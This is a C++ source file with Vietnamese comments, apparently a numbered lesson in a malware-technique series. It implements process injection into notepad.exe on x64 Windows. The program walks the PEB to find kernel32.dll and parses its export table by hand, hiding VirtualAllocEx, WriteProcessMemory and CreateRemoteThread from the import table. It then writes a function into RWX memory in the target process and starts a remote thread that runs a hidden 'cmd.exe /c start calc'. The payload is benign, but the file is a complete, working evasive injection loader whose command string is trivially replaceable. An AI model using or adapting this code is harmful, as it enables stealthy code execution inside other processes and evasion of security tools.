#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa thủ công các cấu trúc Native nội bộ của Windows PEB để bẻ gãy hoàn toàn sự phụ thuộc thư viện ngoài
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN SpareBool;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB, * PPEB;

// Định nghĩa các mẫu con trỏ hàm hệ thống sẽ được bóc tách động
typedef LPVOID(WINAPI* fnVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL(WINAPI* fnWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
typedef HANDLE(WINAPI* fnCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí gánh luồng chạy khi tiêm chéo tiến trình
DWORD WINAPI RemotePebPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Giải thuật đào bới PEB (PEB Walk) tìm kiếm Base Address của một Module trên RAM x64
HMODULE WalkPebToFindModule(const std::wstring& moduleName) {
    // ĐỘT PHÁ X64: Sử dụng hàm Intrinsics bốc chính xác PEB Address qua thanh ghi GS:[0x60]
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (!pPeb || !pPeb->Ldr) return NULL;

    PLDR_DATA_TABLE_ENTRY pModuleEntry = NULL;
    LIST_ENTRY* pListHead = &pPeb->Ldr->InLoadOrderModuleList;
    LIST_ENTRY* pCurrentLink = pListHead->Flink;

    // Duyệt qua liên kết vòng kép danh sách các DLL đã được nạp của tiến trình Loader
    while (pCurrentLink != pListHead) {
        pModuleEntry = CONTAINING_RECORD(pCurrentLink, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

        if (pModuleEntry->BaseDllName.Buffer != NULL) {
            // So sánh chuỗi rộng Unicode, không phân biệt chữ hoa chữ thường
            if (_wcsicmp(pModuleEntry->BaseDllName.Buffer, moduleName.c_str()) == 0) {
                return (HMODULE)pModuleEntry->DllBase;
            }
        }
        pCurrentLink = pCurrentLink->Flink;
    }
    return NULL;
}

// Giải thuật giải phẫu Export Table thủ công để bốc địa chỉ hàm (Thay thế hoàn toàn GetProcAddress)
PVOID GetProcAddressCustom(HMODULE hModule, const char* lpProcName) {
    PBYTE base = (PBYTE)hModule;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(base + dosHeader->e_lfanew);

    DWORD exportRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportRva == 0) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(base + exportRva);
    DWORD* pAddresses = (DWORD*)(base + pExportDir->AddressOfFunctions);
    DWORD* pNames = (DWORD*)(base + pExportDir->AddressOfNames);
    WORD* pOrdinals = (WORD*)(base + pExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        char* functionName = (char*)(base + pNames[i]);
        if (strcmp(functionName, lpProcName) == 0) {
            return (PVOID)(base + pAddresses[pOrdinals[i]]);
        }
    }
    return NULL;
}

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 17: PEB WALK & API OBFUSCATION INJECTION x64" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    // ─── BƯỚC 1: TIẾN HÀNH DUYỆT PEB ĐỂ SĂN LÙNG CƠ SỞ KERNEL32.DLL ───
    std::cout << "[*] Dang thuc hien thu thuat PEB Walk de tim kiem Module..." << std::endl;
    HMODULE hKernel32 = WalkPebToFindModule(L"kernel32.dll");

    if (!hKernel32) {
        std::cerr << "[-] Khong the tim thay kernel32.dll qua PEB Walk!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] SĂN LÙNG PEB THÀNH CÔNG! Base Address Kernel32: 0x" << std::hex << hKernel32 << std::endl;

    // ─── BƯỚC 2: GIẢI PHẪU XUẤT BẢN ĐỘNG CÁC HÀM API HỆ THỐNG CẦN THIẾT ───
    fnVirtualAllocEx pVirtualAllocEx = (fnVirtualAllocEx)GetProcAddressCustom(hKernel32, "VirtualAllocEx");
    fnWriteProcessMemory pWriteProcessMemory = (fnWriteProcessMemory)GetProcAddressCustom(hKernel32, "WriteProcessMemory");
    fnCreateRemoteThread pCreateRemoteThread = (fnCreateRemoteThread)GetProcAddressCustom(hKernel32, "CreateRemoteThread");
    fnWinExec pWinExec = (fnWinExec)GetProcAddressCustom(hKernel32, "WinExec");

    if (!pVirtualAllocEx || !pWriteProcessMemory || !pCreateRemoteThread || !pWinExec) {
        std::cerr << "[-] Giai phau Export Table that bai, thieu ham!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da phan giai dong cac ham an toan ma khong dung IAT Import Table." << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed!" << std::endl;
        return EXIT_FAILURE;
    }

    // ─── BƯỚC 3: CẤP PHÁT BỘ NHỚ VÀ ANH XẠ LÒNG ĐỐI PHƯƠNG ───
    SIZE_T functionSize = 500;
    LPVOID remoteCodeBuffer = pVirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID remoteDataBuffer = pVirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteCodeBuffer || !remoteDataBuffer) {
        std::cerr << "[-] Dynamic VirtualAllocEx failed!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Cap phat vung nho Code RWX dong tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Khởi tạo cấu trúc dữ liệu con trỏ tuyệt đối cục bộ
    THREAD_DATA localData;
    localData.pWinExec = pWinExec;
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy song song logic mã máy và cấu trúc dữ liệu sang RAM đối phương
    pWriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemotePebPayload, functionSize, NULL);
    pWriteProcessMemory(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), NULL);
    std::cout << "[+] Ghi ma may va tham so tuyet doi vao long Notepad thanh cong." << std::endl;

    // ─── BƯỚC 4: KÍCH NỔ LUỒNG THỰC THI QUA CON TRỎ HÀM ĐỘNG ───
    std::cout << "[*] Dang dung CreateRemoteThread duoc giai ma de khoi tao luong..." << std::endl;
    HANDLE hThread = pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, remoteDataBuffer, 0, NULL);

    if (hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE); // Gánh luồng chạy dứt điểm phẳng sạch
        std::cout << "[+] PEB Walk Injection Process Completed Successfully!" << std::endl;
        CloseHandle(hThread);
    }
    else {
        std::cerr << "[-] CreateRemoteThread failed! Error: " << GetLastError() << std::endl;
    }

    // Thu hồi Handle hệ thống
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}